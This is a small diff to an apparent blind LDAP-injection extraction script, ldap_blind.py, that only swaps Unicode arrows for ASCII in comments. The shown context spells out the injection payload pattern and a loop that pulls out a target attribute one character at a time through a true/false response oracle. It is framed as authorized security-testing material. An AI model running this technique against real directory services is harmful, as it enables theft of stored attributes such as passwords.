@@ -4,7 +4,7 @@ ldap_blind.py — authorized BLIND LDAP-injection extractor. Reads a target attr
 through a true/false RESPONSE oracle (LDAP_INJECTION_TESTING_GUIDE.md §8/§12).
 
 How it works: it injects a payload that appends a substring condition to the filter, e.g. for an AND search
-filter (&(objectClass=user)(uid=$q)) it sends  q = <target>)(<attr>=<prefix><char>*  → the entry matches ONLY
+filter (&(objectClass=user)(uid=$q)) it sends  q = <target>)(<attr>=<prefix><char>*  -> the entry matches ONLY
 if <attr> starts with <prefix><char>. If the response then contains the --true marker, the char is confirmed;
 grow the prefix and repeat.
 
@@ -115,7 +115,7 @@ def main():
                 found = ch
                 break
         if found is None:
-            break  # no char extended the prefix → end of value
+            break  # no char extended the prefix -> end of value
         extracted += found
         print(f"   {a.attr}[{a.uid_attr}={a.target_uid}] = {extracted!r}")
     print(f"\n[+] extracted (bounded): {a.attr} = {extracted!r}")
